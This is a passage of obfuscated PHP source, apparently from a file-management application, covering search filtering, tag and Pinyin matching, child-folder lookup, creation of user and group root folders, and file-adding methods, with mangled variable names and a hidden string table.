(isset($İ—Úå­Ø[$ÁØû§éë[2051]]) && $İ—Úå­Ø[$ÁØû§éë[2051]]) { $İ—Úå­Ø[$ÁØû§éë[2051]] = str_replace($ÁØû§éë[435], $ÁØû§éë[2216], trim($İ—Úå­Ø[$ÁØû§éë[2051]])); } $•â®ğÒç = $this->_parseSearchWhere($İ—Úå­Ø); if (!isset($•â®ğÒç[$ÁØû§éë[480]])) { $•â®ğÒç[$ÁØû§éë[480]] = 0; } $…ù›á†˜ = $ÁØû§éë[2217]; $ûë¨¨ÎÒ = $•â®ğÒç; $´Ñ¿›¹ = $…ù›á†˜; $this->_listSearchBindPinyin($İ—Úå­Ø, $•â®ğÒç, $…ù›á†˜); $this->alias($ÁØû§éë[494])->_makeOrder(); $•â®ğÒç = $this->parseWhereLike($•â®ğÒç); $Åí‹õå = $this->distinct(!0)->field($…ù›á†˜)->where($•â®ğÒç)->selectPage($Å•÷¹÷Ï); if ($GLOBALS[$ÁØû§éë[6]][$ÁØû§éë[432]][$ÁØû§éë[433]] && Input::check($İ—Úå­Ø[$ÁØû§éë[2051]], $ÁØû§éë[630]) && $Åí‹õå[$ÁØû§éë[417]][$ÁØû§éë[404]] == 1 && $Åí‹õå[$ÁØû§éë[417]][$ÁØû§éë[418]] == 0) { $Åí‹õå = $this->distinct(!0)->field($…ù›á†˜)->where($ûë¨¨ÎÒ)->limit(1000)->select(); $Åí‹õå = array_page_split($Åí‹õå, !1, $Å•÷¹÷Ï); } $this->_listSearchFileContent($Åí‹õå, $İ—Úå­Ø, $´Ñ¿›¹, $ûë¨¨ÎÒ); $this->_listSearchDesc($Åí‹õå, $İ—Úå­Ø, $´Ñ¿›¹); $this->_listSearchTag($Åí‹õå, $İ—Úå­Ø, $´Ñ¿›¹); $this->_listSearchGroupTag($Åí‹õå, $İ—Úå­Ø, $´Ñ¿›¹); $this->_listDataApply($Åí‹õå[$ÁØû§éë[420]]); $this->_listMake($Åí‹õå); return $Åí‹õå; } private function _listSearchFileContent(&$Ú×õòş¯, $Ü´ËáŠ‹, $ùä½õíÁ, $­¼¨×ä°) { $÷—ÚÒã =& $_SERVER[³à¼î¯á]; if (!$Ü´ËáŠ‹[$÷—ÚÒã[2051]] || $Ú×õòş¯[$÷—ÚÒã[417]][$÷—ÚÒã[404]] > 1) { return; } if (!isset($­¼¨×ä°[$÷—ÚÒã[32]]) || !is_array($Ü´ËáŠ‹[$÷—ÚÒã[516]])) { return; } $­¼¨×ä°[$÷—ÚÒã[516]] = array($÷—ÚÒã[7], $Ü´ËáŠ‹[$÷—ÚÒã[516]]); unset($­¼¨×ä°[$÷—ÚÒã[32]]); unset($Ü´ËáŠ‹[$÷—ÚÒã[516]]); $€ºâÏıô = $this->field($ùä½õíÁ)->where($­¼¨×ä°)->limit($÷—ÚÒã[2218])->select(); if (!$€ºâÏıô || count($€ºâÏıô) == 0) { return; } $Ú×õòş¯[$÷—ÚÒã[420]] = array_merge($€ºâÏıô, $Ú×õòş¯[$÷—ÚÒã[420]]); $Ú×õòş¯[$÷—ÚÒã[417]][$÷—ÚÒã[418]] += count($€ºâÏıô); } private function _listSearchTag(&$¥¢ñú´Å, $–ø°±¨ø, $Åóì§ò) { $ˆ ¹ä“… =& $_SERVER[³à¼î¯á]; if (!$–ø°±¨ø[$ˆ ¹ä“…[2051]] || $¥¢ñú´Å[$ˆ ¹ä“…[417]][$ˆ ¹ä“…[404]] > 1) { return; } $ ÏÕ‚Ş‘ = Model($ˆ ¹ä“…[2219])->listData(); $¦²ÈşÍí = array(); $˜’ñ¸Ã™ = $–ø°±¨ø[$ˆ ¹ä“…[2051]]; foreach ($ ÏÕ‚Ş‘ as $‚ÊÅèÊ÷) { $ç¿½„œ¶ = $‚ÊÅèÊ÷[$ˆ ¹ä“…[32]]; $â¾Ûó£ = str_replace($ˆ ¹ä“…[53], $ˆ ¹ä“…[12], Pinyin::get($ç¿½„œ¶)); if (stripos($ç¿½„œ¶, $˜’ñ¸Ã™) !== !1 || stripos($â¾Ûó£, $˜’ñ¸Ã™) !== !1) { $¦²ÈşÍí[] = $‚ÊÅèÊ÷[$ˆ ¹ä“…[450]]; } } if (!$¦²ÈşÍí) { return; } $•–Ëï°î = array($ˆ ¹ä“…[475] => array($ˆ ¹ä“…[7], $¦²ÈşÍí), $ˆ ¹ä“…[1753] => USER_ID); $ø–æ±Õæ = Model($ˆ ¹ä“…[477])->field($ˆ ¹ä“…[87])->where($•–Ëï°î)->select(); $ø–æ±Õæ = array_to_keyvalue($ø–æ±Õæ, $ˆ ¹ä“…[12], $ˆ ¹ä“…[87]); $û·÷˜°‹ = array_unique($ø–æ±Õæ); $this->_listSearchMerge($¥¢ñú´Å, $–ø°±¨ø, $Åóì§ò, $û·÷˜°‹); } private function _listSearchDesc(&$üË§á¿, $ÇÈ§é©, $éÀ–¡Ï) { $Ñèå™¤ =& $_SERVER[³à¼î¯á]; if (!$ÇÈ§é©[$Ñèå™¤[2051]] || $üË§á¿[$Ñèå™¤[417]][$Ñèå™¤[404]] > 1) { return; } $ Í³¹ = array($Ñèå™¤[97] => $Ñèå™¤[501], $Ñèå™¤[425] => array($Ñèå™¤[434], $Ñèå™¤[2053] . $ÇÈ§é©[$Ñèå™¤[2051]] . $Ñèå™¤[2053])); $€˜ğŞ÷ = !1; if ($€˜ğŞ÷) { $¤±‘ƒË = $this->listSearchChildren($ÇÈ§é©[$Ñèå™¤[183]]); $¤±‘ƒË = array_unique($¤±‘ƒË); if (!$¤±‘ƒË) { return; } $ Í³¹[$Ñèå™¤[184]] = array($Ñèå™¤[7], $¤±‘ƒË); } $ı¡ßÖÄû = Model($Ñèå™¤[607])->field($Ñèå™¤[184])->where($ Í³¹)->limit(5000)->select(); $»êÆÅíª = array_to_keyvalue($ı¡ßÖÄû, $Ñèå™¤[12], $Ñèå™¤[184]); $this->_listSearchMerge($üË§á¿, $ÇÈ§é©, $éÀ–¡Ï, $»êÆÅíª); } private function _listSearchGroupTag(&$‚¢ºëÎ», $ìêÎúÛœ, $´À­Œ) { $«Ş¥ÅŞ =& $_SERVER[³à¼î¯á]; if (!$ìêÎúÛœ[$«Ş¥ÅŞ[2051]] || $‚¢ºëÎ»[$«Ş¥ÅŞ[417]][$«Ş¥ÅŞ[404]] > 1 || !$ìêÎúÛœ[$«Ş¥ÅŞ[183]]) { return; } $àŠ¥’ëà = $this->sourceInfo($ìêÎúÛœ[$«Ş¥ÅŞ[183]]); if (!$àŠ¥’ëà || $àŠ¥’ëà[$«Ş¥ÅŞ[181]] != SourceModel::TYPE_GROUP) { return; } $šÒ‘§Öó = $àŠ¥’ëà[$«Ş¥ÅŞ[545]]; $Şûâƒ‰ = Model($«Ş¥ÅŞ[2220])->get($šÒ‘§Öó); $Ã±šƒê = array(); $ åà¨¼· = $ìêÎúÛœ[$«Ş¥ÅŞ[2051]]; foreach ($Şûâƒ‰[$«Ş¥ÅŞ[420]] as $¹Şá¯Ä) { $Ú‘Ÿ”…º = $¹Şá¯Ä[$«Ş¥ÅŞ[32]]; $“ïâ¾×è = str_replace($«Ş¥ÅŞ[53], $«Ş¥ÅŞ[12], Pinyin::get($Ú‘Ÿ”…º)); if (stripos($Ú‘Ÿ”…º, $ åà¨¼·) !== !1 || stripos($“ïâ¾×è, $ åà¨¼·) !== !1) { $Ã±šƒê[] = $¹Şá¯Ä[$«Ş¥ÅŞ[450]]; } } if (!$Ã±šƒê) { return; } $ûÖ¯™å = array($«Ş¥ÅŞ[475] => array($«Ş¥ÅŞ[7], $Ã±šƒê), $«Ş¥ÅŞ[1753] => 0, $«Ş¥ÅŞ[33] => $«Ş¥ÅŞ[2073] . $šÒ‘§Öó); $ì‹Ç = Model($«Ş¥ÅŞ[477])->field($«Ş¥ÅŞ[87])->where($ûÖ¯™å)->select(); $ì‹Ç = array_to_keyvalue($ì‹Ç, $«Ş¥ÅŞ[12], $«Ş¥ÅŞ[87]); $Ğ´‡Ì•ì = array_unique($ì‹Ç); $this->_listSearchMerge($‚¢ºëÎ», $ìêÎúÛœ, $´À­Œ, $Ğ´‡Ì•ì); } private function _listSearchMerge(&$ü¨Á´ü, $·‘·…åÊ, $¬ÑşÀ¤Î, $´´ÒúŸó) { $Ñ¶á–ò =& $_SERVER[³à¼î¯á]; if (!$´´ÒúŸó) { return; } $‹æ¡ŒØÁ = array_to_keyvalue($ü¨Á´ü[$Ñ¶á–ò[420]], $Ñ¶á–ò[12], $Ñ¶á–ò[184]); $ìËğµ²‚ = array_diff($´´ÒúŸó, $‹æ¡ŒØÁ); if (!$ìËğµ²‚) { return; } $ßïìÖ¼ = array($Ñ¶á–ò[184] => array($Ñ¶á–ò[7], $ìËğµ²‚)); $ìş’àÊª = $this->field($¬ÑşÀ¤Î)->where($ßïìÖ¼)->select(); if (!$ìş’àÊª) { return; } $Şù´ÔúŒ = array(); foreach ($ìş’àÊª as $ÍŸõîãÌ) { if ($this->_listSearchFilter($ÍŸõîãÌ, $·‘·…åÊ)) { $Şù´ÔúŒ[] = $ÍŸõîãÌ; } } $ü¨Á´ü[$Ñ¶á–ò[420]] = array_merge($Şù´ÔúŒ, $ü¨Á´ü[$Ñ¶á–ò[420]]); $ü¨Á´ü[$Ñ¶á–ò[417]][$Ñ¶á–ò[418]] += count($Şù´ÔúŒ); } private function _listSearchFilter($Îªùœüš, $ÌšÙñ³ù) { $’§úò·É =& $_SERVER[³à¼î¯á]; $Œ¿Û÷„À = $Îªùœüš[$’§úò·É[460]] == $’§úò·É[91]; if (!strstr($Îªùœüš[$’§úò·É[560]], $’§úò·É[50] . $ÌšÙñ³ù[$’§úò·É[183]] . $’§úò·É[50])) { return !1; } if (isset($ÌšÙñ³ù[$’§úò·É[461]]) && $ÌšÙñ³ù[$’§úò·É[461]] != $’§úò·É[2008]) { if ($ÌšÙñ³ù[$’§úò·É[461]] == $’§úò·É[78] && !$Œ¿Û÷„À) { return !1; } if ($ÌšÙñ³ù[$’§úò·É[461]] != $’§úò·É[78] && $Œ¿Û÷„À) { return !1; } if (!strstr($Îªùœüš[$’§úò·É[178]], $’§úò·É[50] . $ÌšÙñ³ù[$’§úò·É[461]] . $’§úò·É[50])) { return !1; } } if (isset($ÌšÙñ³ù[$’§úò·É[2221]]) && $ÌšÙñ³ù[$’§úò·É[2221]] < $Îªùœüš[$’§úò·É[79]]) { return !1; } if (isset($ÌšÙñ³ù[$’§úò·É[2222]]) && $ÌšÙñ³ù[$’§úò·É[2222]] > $Îªùœüš[$’§úò·É[79]]) { return !1; } if (isset($ÌšÙñ³ù[$’§úò·É[637]]) && $ÌšÙñ³ù[$’§úò·É[637]] != $Îªùœüš[$’§úò·É[504]]) { return !1; } return !0; } public function listSearchChildren($á­‡Şº, $Ã£¿±º… = 5000) { $™ŠŒŒ© =& $_SERVER[³à¼î¯á]; $¢™»†óà = array(); $™×ÀÜèö = $this->sourceInfo($á­‡Şº); $»²Ò÷•î = array($™ŠŒŒ©[560] => array($™ŠŒŒ©[434], $™×ÀÜèö[$™ŠŒŒ©[560]] . $™×ÀÜèö[$™ŠŒŒ©[184]] . $™ŠŒŒ©[588])); $–ƒ•·«» = $this->field($™ŠŒŒ©[79])->where($»²Ò÷•î)->limit($Ã£¿±º… + 1)->select(); $ƒŞˆÃ = is_array($–ƒ•·«») ? count($–ƒ•·«») : 0; if ($ƒŞˆÃ > $Ã£¿±º…) { return $this->_listSearchChildrenNear($á­‡Şº, $Ã£¿±º…); } $Â²íÆ›» = $this->field($™ŠŒŒ©[184])->where($»²Ò÷•î)->select(); $¢™»†óà = array_to_keyvalue($Â²íÆ›», $™ŠŒŒ©[12], $™ŠŒŒ©[184]); return $¢™»†óà; } private function _listSearchChildrenNear($ØåôÛ¢Ö, $€Û²êÛ) { $Ö‡ÌÃı‹ =& $_SERVER[³à¼î¯á]; $‰éà¿Ş¹ = array(); $À†Š˜‹½ = array($Ö‡ÌÃı‹[183] => $ØåôÛ¢Ö); $¡ÇìÖ¡ò = $this->field($Ö‡ÌÃı‹[2223])->where($À†Š˜‹½)->select(); $ç—‡†¸ = array_to_keyvalue(array_filter_by_field($¡ÇìÖ¡ò, $Ö‡ÌÃı‹[460], $Ö‡ÌÃı‹[91]), $Ö‡ÌÃı‹[12], $Ö‡ÌÃı‹[184]); $‰éà¿Ş¹ = array_merge($‰éà¿Ş¹, array_to_keyvalue($¡ÇìÖ¡ò, $Ö‡ÌÃı‹[12], $Ö‡ÌÃı‹[184])); if (!$ç—‡†¸) { return $‰éà¿Ş¹; } $À†Š˜‹½ = array($Ö‡ÌÃı‹[183] => array($Ö‡ÌÃı‹[7], $ç—‡†¸)); $¡ÇìÖ¡ò = $this->field($Ö‡ÌÃı‹[2223])->where($À†Š˜‹½)->limit($€Û²êÛ)->select(); $‰éà¿Ş¹ = array_merge($‰éà¿Ş¹, array_to_keyvalue($¡ÇìÖ¡ò, $Ö‡ÌÃı‹[12], $Ö‡ÌÃı‹[184])); $‰éà¿Ş¹ = array_slice($‰éà¿Ş¹, 0, intval($€Û²êÛ)); return $‰éà¿Ş¹; } private function _listSearchBindPinyin($•à¼…ÓÄ, &$ÅöÍÚ™ë, &$¾ù­¦È¯) { $ğÉ–±»¢ =& $_SERVER[³à¼î¯á]; if (!isset($•à¼…ÓÄ[$ğÉ–±»¢[2051]]) || !$•à¼…ÓÄ[$ğÉ–±»¢[2051]]) { return; } if (!Input::check($•à¼…ÓÄ[$ğÉ–±»¢[2051]], $ğÉ–±»¢[369]) || strlen($•à¼…ÓÄ[$ğÉ–±»¢[2051]]) < 2) { return; } $ˆÅ¹” = "\x4c\x45\x46\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x69\x6f\137\x73\157\165\162\143\x65\x5f\155\145\x74\x61\40\155\145\x74\x61\x20\157\x6e\x20\163\x6f\165\x72\x63\x65\x2e\x73\x6f\165\x72\143\x65\x49\x44\40\75\40\x6d\x65\x74\x61\x2e\163\x6f\165\x72\x63\145\111\x44"; $©½­úÜË = array(); $¾ù­¦È¯ = str_replace(array($ğÉ–±»¢[253], $ğÉ–±»¢[53], $ğÉ–±»¢[2224]), $ğÉ–±»¢[12], $¾ù­¦È¯); $¾ù­¦È¯ = $ğÉ–±»¢[486] . str_replace($ğÉ–±»¢[50], $ğÉ–±»¢[487], $¾ù­¦È¯); $Û§é¸ = $ÅöÍÚ™ë[$ğÉ–±»¢[32]]; unset($ÅöÍÚ™ë[$ğÉ–±»¢[32]]); foreach ($ÅöÍÚ™ë as $Ì¨ä³Ê¡ => $€”à¶î) { $©½­úÜË[$ğÉ–±»¢[486] . $Ì¨ä³Ê¡] = $€”à¶î; } foreach ($Û§é¸ as $‹¾¨•¶) { $©½­úÜË[] = array($ğÉ–±»¢[491] => $‹¾¨•¶, $ğÉ–±»¢[1050] => $ğÉ–±»¢[2055], array($ğÉ–±»¢[2225] => $‹¾¨•¶, $ğÉ–±»¢[2226] => array($ğÉ–±»¢[7], array($ğÉ–±»¢[513], $ğÉ–±»¢[512])))); } $this->join($ˆÅ¹”); $ÅöÍÚ™ë = $©½­úÜË; } private function _parseSearchWhere($ı¼‰—€) { $Š’™ğª =& $_SERVER[³à¼î¯á]; $Í¬Š£½» = array(); if (isset($ı¼‰—€[$Š’™ğª[805]]) && $ı¼‰—€[$Š’™ğª[805]]) { $Í¬Š£½»[$Š’™ğª[88]] = array($Š’™ğª[2227], $ı¼‰—€[$Š’™ğª[805]]); } if (isset($ı¼‰—€[$Š’™ğª[806]]) && $ı¼‰—€[$Š’™ğª[806]]) { $şšÍ‹ÂÖ = array($Š’™ğª[2228], $ı¼‰—€[$Š’™ğª[806]]); if ($Í¬Š£½»[$Š’™ğª[88]]) { $Í¬Š£½»[$Š’™ğª[88]] = array($Í¬Š£½»[$Š’™ğª[88]], $şšÍ‹ÂÖ, $Š’™ğª[2229]); } else { $Í¬Š£½»[$Š’™ğª[88]] = $şšÍ‹ÂÖ; } } if (isset($ı¼‰—€[$Š’™ğª[2221]]) && $ı¼‰—€[$Š’™ğª[2221]] > 0) { $Í¬Š£½»[$Š’™ğª[79]] = array($Š’™ğª[2227], $ı¼‰—€[$Š’™ğª[2221]]); } if (isset($ı¼‰—€[$Š’™ğª[2222]]) && $ı¼‰—€[$Š’™ğª[2222]]) { $şšÍ‹ÂÖ = array($Š’™ğª[2228], $ı¼‰—€[$Š’™ğª[2222]]); if ($Í¬Š£½»[$Š’™ğª[79]]) { $Í¬Š£½»[$Š’™ğª[79]] = array($Í¬Š£½»[$Š’™ğª[79]], $şšÍ‹ÂÖ, $Š’™ğª[2229]); } else { $Í¬Š£½»[$Š’™ğª[79]] = $şšÍ‹ÂÖ; } } if (isset($ı¼‰—€[$Š’™ğª[637]]) && $ı¼‰—€[$Š’™ğª[637]]) { $Í¬Š£½»[] = array($Š’™ğª[504] => $ı¼‰—€[$Š’™ğª[637]], $Š’™ğª[502] => $ı¼‰—€[$Š’™ğª[637]], $Š’™ğª[1050] => $Š’™ğª[2055]); } if (isset($ı¼‰—€[$Š’™ğª[461]]) && $ı¼‰—€[$Š’™ğª[461]]) { $˜÷å¿Á = $ı¼‰—€[$Š’™ğª[461]]; if ($˜÷å¿Á == $Š’™ğª[78]) { $Í¬Š£½»[$Š’™ğª[460]] = 1; } else { if ($˜÷å¿Á == $Š’™ğª[2230]) { $Í¬Š£½»[$Š’™ğª[460]] = 0; } else { if ($˜÷å¿Á) { $˜÷å¿Á = is_array($˜÷å¿Á) ? $˜÷å¿Á : explode($Š’™ğª[50], $˜÷å¿Á); $Í¬Š£½»[$Š’™ğª[461]] = array($Š’™ğª[467], $˜÷å¿Á); $Í¬Š£½»[$Š’™ğª[460]] = 0; } } } } $this->_parseSearchParent($ı¼‰—€, $Í¬Š£½»); if (isset($ı¼‰—€[$Š’™ğª[2051]]) && trim($ı¼‰—€[$Š’™ğª[2051]])) { $Â±õòİá = trim($ı¼‰—€[$Š’™ğª[2051]]); $—²Å›ªÒ = explode($Š’™ğª[53], $Â±õòİá); if (strlen($Â±õòİá) > 2 && (substr($Â±õòİá, 0, 1) == $Š’™ğª[121] && substr($Â±õòİá, -1) == $Š’™ğª[121]) || substr($Â±õòİá, 0, 1) == $Š’™ğª[58] && substr($Â±õòİá, -1) == $Š’™ğª[58]) { $Â±õòİá = substr($Â±õòİá, 1, -1); $—²Å›ªÒ = array($Â±õòİá); } $Í¬Š£½»[$Š’™ğª[32]] = array(array($Š’™ğª[587], $Š’™ğª[2053] . $Â±õòİá . $Š’™ğª[2053])); if (count($—²Å›ªÒ) > 1) { $Í¬Š£½»[$Š’™ğª[32]] = array(); foreach ($—²Å›ªÒ as $¸ü•±¿æ) { if (!trim($¸ü•±¿æ)) { continue; } $Í¬Š£½»[$Š’™ğª[32]][] = array($Š’™ğª[587], $Š’™ğª[2053] . trim($¸ü•±¿æ) . $Š’™ğª[2053]); } } } return $Í¬Š£½»; } private function _parseSearchParent($×Ãşš‡¶, &$îœÇ¶Éš) { $»¿¦×° =& $_SERVER[³à¼î¯á]; if (!isset($×Ãşš‡¶[$»¿¦×°[183]]) || !$×Ãşš‡¶[$»¿¦×°[183]]) { return; } $šµîÜ–Å = $this->pathInfo($×Ãşš‡¶[$»¿¦×°[183]]); $ûõÒœÏ£ = $šµîÜ–Å[$»¿¦×°[183]] . $»¿¦×°[12] === $»¿¦×°[219]; $¨°®Ä×À = $šµîÜ–Å[$»¿¦×°[181]] == $»¿¦×°[554]; if ($šµîÜ–Å[$»¿¦×°[571]] == $»¿¦×°[572]) { $æÊÆô÷Œ = $this->sourceInfo($×Ãşš‡¶[$»¿¦×°[183]]); $šµîÜ–Å[$»¿¦×°[560]] = $æÊÆô÷Œ[$»¿¦×°[560]]; } $îœÇ¶Éš[$»¿¦×°[627]] = array($»¿¦×°[587], $šµîÜ–Å[$»¿¦×°[560]] . $×Ãşš‡¶[$»¿¦×°[183]] . $»¿¦×°[588]); $¨£¿ò¡µ = isset($×Ãşš‡¶[$»¿¦×°[1911]]) && in_array($»¿¦×°[554], $×Ãşš‡¶[$»¿¦×°[1911]]); if (!$¨£¿ò¡µ || !$¨°®Ä×À || !$ûõÒœÏ£ || !$šµîÜ–Å[$»¿¦×°[462]]) { return; } if (!AuthModel::authCheckRoot($šµîÜ–Å[$»¿¦×°[462]][$»¿¦×°[463]])) { return; } $¯üÕÒÀ· = $šµîÜ–Å[$»¿¦×°[545]] . $»¿¦×°[12]; if ($¯üÕÒÀ· == $»¿¦×°[91]) { unset($îœÇ¶Éš[$»¿¦×°[627]]); $îœÇ¶Éš[$»¿¦×°[181]] = self::TYPE_GROUP; return; } $«òŸğ³Ü = Model($»¿¦×°[561])->groupChildrenAll($¯üÕÒÀ·); $ûÚË’›¯ = count($«òŸğ³Ü); if ($ûÚË’›¯ <= 1) { return; } $·Ù°Şä± = array($»¿¦×°[183] => 0, $»¿¦×°[181] => self::TYPE_GROUP, $»¿¦×°[545] => array($»¿¦×°[7], $«òŸğ³Ü)); $ÄñìÀá† = $this->field($»¿¦×°[2231])->where($·Ù°Şä±)->limit($ûÚË’›¯)->select(); $îœÇ¶Éš[$»¿¦×°[627]] = array(); foreach ($ÄñìÀá† as $×ùÙ…ëÇ) { $îœÇ¶Éš[$»¿¦×°[627]][] = array($»¿¦×°[587], $»¿¦×°[570] . $×ùÙ…ëÇ[$»¿¦×°[184]] . $»¿¦×°[588]); } $îœÇ¶Éš[$»¿¦×°[627]][] = $»¿¦×°[2055]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ù¢®Ï›) { $ğ°”›Ò¼ =& $_SERVER[³à¼î¯á]; $Ş©ß•ÑĞ = Model($ğ°”›Ò¼[553])->where(array($ğ°”›Ò¼[1744] => $Ù¢®Ï›))->find(); $—®¸ø = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ù¢®Ï›, $Ş©ß•ÑĞ[$ğ°”›Ò¼[32]]); $this->userDesktopAdd($—®¸ø); return $—®¸ø; } public function userDesktopAdd($ÒĞãÏ‰) { $Æ•ğïôÖ =& $_SERVER[³à¼î¯á]; $•ºåâ¸å = LNG($Æ•ğïôÖ[2232]); $ƒ•ÄúÛ = $this->mkdir($ÒĞãÏ‰, $•ºåâ¸å); $this->metaSet($ƒ•ÄúÛ, $Æ•ğïôÖ[2233], $Æ•ğïôÖ[91]); $this->metaSet($ÒĞãÏ‰, $Æ•ğïôÖ[2234], $ƒ•ÄúÛ); } public function userPathSafeAdd($©Ã¾¬ú) { $±Àçœ†¨ =& $_SERVER[³à¼î¯á]; $È¦´…ó = Model($±Àçœ†¨[553])->getInfoFull($©Ã¾¬ú); if (!$È¦´…ó) { return !1; } if (_get($È¦´…ó, $±Àçœ†¨[575])) { return $È¦´…ó[$±Àçœ†¨[514]][$±Àçœ†¨[2235]]; } $º£Åóƒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $©Ã¾¬ú, $±Àçœ†¨[2236], $±Àçœ†¨[481]); Model($±Àçœ†¨[553])->metaSet($©Ã¾¬ú, $±Àçœ†¨[2235], $º£Åóƒ); $this->metaSet($º£Åóƒ, $±Àçœ†¨[2237], $©Ã¾¬ú); return $º£Åóƒ; } public function groupRootAdd($ö¬©Ğòİ) { $àÂÍè® =& $_SERVER[³à¼î¯á]; $×¸ÇËÂº = Model($àÂÍè®[561])->where(array($àÂÍè®[2045] => $ö¬©Ğòİ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ö¬©Ğòİ, $×¸ÇËÂº[$àÂÍè®[32]]); } public function systemRootPathAdd($¡ë®Œ¤Œ) { if ($¡ë®Œ¤Œ != $_SERVER[³à¼î¯á][581]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¡ë®Œ¤Œ); } public function userRootRemove($ÉÍ¤º†¾) { $ïèÒêèÓ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÉÍ¤º†¾, !0); foreach ($ïèÒêèÓ as $•‘İ”ŸÛ) { if (!$•‘İ”ŸÛ) { continue; } $this->remove($•‘İ”ŸÛ[$_SERVER[³à¼î¯á][184]], !1); } } public function groupRootRemove($ùÑ²§Óª) { $ÍëÑ¢ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ùÑ²§Óª); if (!$ÍëÑ¢) { return; } $this->remove($ÍëÑ¢[$_SERVER[³à¼î¯á][184]], !1); } private function _mkdirRoot($’Õªìú‹, $£ê»öŠü, $ò­ŞÁ¾ı, $ò—ãïÄ = '') { $õ÷ØŒ§· =& $_SERVER[³à¼î¯á]; $®ãõ¨˜Ş = defined($õ÷ØŒ§·[2179]) ? USER_ID : 0; $‚íÙœ³³ = array($õ÷ØŒ§·[452] => 0, $õ÷ØŒ§·[623] => $’Õªìú‹, $õ÷ØŒ§·[624] => $£ê»öŠü, $õ÷ØŒ§·[621] => 1, $õ÷ØŒ§·[625] => $®ãõ¨˜Ş, $õ÷ØŒ§·[626] => $®ãõ¨˜Ş, $õ÷ØŒ§·[622] => $ò—ãïÄ, $õ÷ØŒ§·[627] => $õ÷ØŒ§·[570], $õ÷ØŒ§·[479] => 0, $õ÷ØŒ§·[592] => 0, $õ÷ØŒ§·[517] => 0, $õ÷ØŒ§·[628] => $õ÷ØŒ§·[12]); if ($¬«üÚ‰ = $this->where($‚íÙœ³³)->find()) { return $¬«üÚ‰[$õ÷ØŒ§·[184]]; } $ÓŸ®Ü‚ƒ = "\115\157\144\x65\x6c\x53\157\x75\162\143\x65\56\155\153\144\151\162\122\x6f\x6f\164\x2e{$’Õªìú‹}\56{$£ê»öŠü}\x2e" . $ò­ŞÁ¾ı; CacheLock::lock($ÓŸ®Ü‚ƒ); $‚íÙœ³³[$õ÷ØŒ§·[32]] = $ò­ŞÁ¾ı; $Â™ÁòÈ = $this->add($‚íÙœ³³); $ëâ¶èş½ = array($õ÷ØŒ§·[629] => short_id($Â™ÁòÈ)); $this->where(array($õ÷ØŒ§·[466] => $Â™ÁòÈ))->save($ëâ¶èş½); CacheLock::unlock($ÓŸ®Ü‚ƒ); return $Â™ÁòÈ; } private function targetSourceRoot($À’ığï¶, $³ì‰ÔŒ, $½õÊ§È» = false) { $“§¤µÛ =& $_SERVER[³à¼î¯á]; $‰«´ïõ = array($“§¤µÛ[452] => 0, $“§¤µÛ[623] => $À’ığï¶, $“§¤µÛ[624] => $³ì‰ÔŒ); if ($½õÊ§È») { $äËÂÁ = $this->where($‰«´ïõ)->select(); return $äËÂÁ ? $äËÂÁ : array(); } $ã– ø±« = $this->where($‰«´ïõ)->find(); return $ã– ø±« ? $ã– ø±« : array(); } public function sourceRootGroup($ñ”Éó‘û) { $ÛıåÒŞ =& $_SERVER[³à¼î¯á]; if (is_string($ñ”Éó‘û)) { $ñ”Éó‘û = array($ñ”Éó‘û); } $Ó×‰À÷ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ñ”Éó‘û, $ÛıåÒŞ[211]); $Îä’Éó‘ = array($ÛıåÒŞ[420] => $Ó×‰À÷, $ÛıåÒŞ[417] => array($ÛıåÒŞ[803] => count($ñ”Éó‘û))); $this->_listDataApply($Îä’Éó‘[$ÛıåÒŞ[420]]); $this->_listMake($Îä’Éó‘); return array_to_keyvalue($Îä’Éó‘[$ÛıåÒŞ[85]], $ÛıåÒŞ[545]); } public function mkfile($‹Æ¿û½‹, $«œ¨û½, $ÙüºÙñ´ = '', $±“úğ–í = REPEAT_RENAME) { $ÊĞÎÓ× =& $_SERVER[³à¼î¯á]; $Ÿ±ÛÈ¡² = Model($ÊĞÎÓ×[649])->addFileByContent($ÙüºÙñ´, $«œ¨û½); return $this->_createFileCall($‹Æ¿û½‹, $«œ¨û½, $Ÿ±ÛÈ¡², $±“úğ–í, $ÊĞÎÓ×[1398]); } public function addFile($ã”³œ—Á, $«œ±·²², $âÜÖ, $ôÜ¥İÁØ = false, $³òìß = REPEAT_RENAME) { $©™¾¶Ê‡ = Model($_SERVER[³à¼î¯á][649])->addFile($«œ±·²², $âÜÖ, $ôÜ¥İÁØ); return $this->_createFileCall($ã”³œ—Á, $âÜÖ, $©™¾¶Ê‡, $³òìß); } public function addFileByFileID($ªÔËµÚË, $²ÊœÁØ, $¯ š³ü, $¼¸ŸÅ = REPEAT_RENAME) { $³‚Ï˜ŸÈ =& $_SERVER[³à¼î¯á]; $ùÓŸ‡Ôâ = Model($³‚Ï˜ŸÈ[649])->find($²ÊœÁØ); Model($³‚Ï˜ŸÈ[649])->linkAdd($²ÊœÁØ); return $this->_createFileCall($ªÔËµÚË, $¯ š³ü, $ùÓŸ‡Ôâ, $¼¸ŸÅ); } public function addFileByRemote($ïÌ¯¡İ£, $òã÷¶°, $Ûïê‡Ø¥, $­öÆÛüÒ = array(), $—ã©¢Éğ = REPEAT_RENAME) { $—ˆØ¶´¨ = Model($_SERVER[³à¼î¯á][649])->addFileByRemote($òã÷¶°, $Ûïê‡Ø¥, $­öÆÛüÒ); return $this->_createFileCall($ïÌ¯¡İ£, $Ûïê‡Ø¥, $—ˆØ¶´¨, $—ã©¢Éğ); } private function _createFileCall($Š‘Èñú¦, $·êú§ø†, $’€Ó”­´, $µ¶öÌî, $àúêğ‚¨ = "\x75\160\x6c\157\x61\144") { $Ø¹Ì×ò¶ =& $_SERVER[³à¼î¯á]; $„îû˜Å· = !1; $this->setMasterDB(); $this->lockWriteStart($Š‘Èñú¦, $·êú§ø†); $­«Àë³È = $this->fileNameExist($Š‘Èñú¦, $·êú§ø†); $é«™®© = $this->_createFile($Š‘Èñú¦, $·êú§ø†, $’€Ó”­´, $µ¶öÌî, $„îû˜Å·); if (!$„îû˜Å·) { Model($Ø¹Ì×ò¶[519])->remove($’€Ó”­´[$Ø¹Ì×ò¶[516]]); } if ($„îû˜Å· && 